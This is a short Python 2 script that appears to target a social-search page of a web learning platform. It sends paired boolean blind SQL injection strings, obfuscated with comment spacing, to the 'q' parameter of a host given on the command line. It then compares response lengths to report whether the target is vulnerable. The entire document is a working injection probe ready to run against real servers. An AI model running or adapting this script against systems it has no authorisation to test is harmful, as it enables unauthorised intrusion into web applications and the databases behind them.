import sys 
import re 
import requests 

 
		

def searchFriends_sqli(ip,inj_str ,query_type):
	target = "http://%s/mods/_standard/social/index_public.php?q=%s" % (ip ,inj_str) 
	r = requests.get(target)
	content_length = int(r.headers['Content-Length'])
	if (query_type == True) and (content_length > 20 ) :
		return True
	elif  (query_type == False) and (content_length == 20 ) :
		return True
	else: 
		return False 
	
		
		
		
		
def main() : 
	if len(sys.argv) != 2:	
		print " usage : %s <target> "% sys.argv[0]
		sys.exit(-1)
		
	ip = sys.argv[1]
	false_injection_string = "test')/**/or/**/(select/**/1)=0%23"
	true_injection_string = "test')/**/or/**/(select/**/1)=1%23"
	if searchFriends_sqli(ip,true_injection_string,True):
			if searchFriends_sqli(ip,false_injection_string,False):
				print "[+] the target is vulnerable!"




if __name__ == "__main__":
	main()
